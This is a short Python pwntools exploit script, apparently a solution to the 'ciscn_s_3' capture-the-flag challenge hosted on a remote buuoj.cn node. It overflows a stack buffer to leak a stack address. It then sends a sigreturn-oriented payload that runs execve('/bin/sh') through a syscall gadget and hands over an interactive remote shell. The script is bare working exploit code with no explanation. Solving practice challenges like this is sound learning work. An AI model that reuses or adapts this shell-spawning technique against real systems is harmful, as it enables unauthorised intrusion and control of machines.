from pwn import *
from LibcSearcher import LibcSearcher

#
context(os='linux', arch='amd64', log_level='debug')
#context(os='linux', arch='i386', log_level='debug')
#io = process('./ciscn_s_3')
#
io = connect('node5.buuoj.cn',25552)
elf=ELF('./ciscn_s_3')
#gdb.attach(io)

def rl():
	io.recvline()
def ru(s):
	io.recvuntil(s)
def sl(s):
	io.sendline(s)
def sd(s):
	io.send(s)

def plt(s):
	return elf.plt[s]
def got(s):
	return elf.got[s]

vuln=0x4004ED
pl=b'/bin/sh\x00'.ljust(0x10,b'b')
pl+=p64(vuln)
sd(pl)
ba=u64(io.recvuntil('\x7f\x00\x00')[-8:])-0x118#remote:0x118; local:0x148

syscall=0x400517
rax_15=0x4004DA
sigframe = SigreturnFrame()
sigframe.rax = constants.SYS_execve
sigframe.rdi = ba
sigframe.rsi = 0x0
sigframe.rdx = 0x0
sigframe.rip = syscall

pl=b'/bin/sh\x00'.ljust(0x10,b'b')+p64(rax_15)+p64(syscall)+bytes(sigframe)
sd(pl)

#
io.interactive()
